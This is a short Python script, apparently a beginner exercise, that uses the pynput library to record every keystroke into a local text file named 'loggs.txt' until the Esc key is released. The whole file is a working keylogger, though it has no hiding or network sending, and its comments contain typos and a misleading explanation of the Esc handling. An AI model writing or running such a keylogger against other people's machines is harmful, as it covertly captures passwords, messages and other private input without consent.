import sys
from pynput.keyboard import Listener,Key
# ^ install the pynput libary from the command line first
def key_pressed (key):
    with open ("loggs.txt","a") as logs_file:
        logs_file.write(str({key}))
        logs_file.write("\n")
        # ^ this write the keystrokes as text in a file
def key_unpressed (key):
    if key == Key.esc:
        return 0
        # ^ when key unpress will record next keystroke
with Listener (on_press=key_pressed,on_release= key_unpressed) as listener :
    listener.join()


#512-04
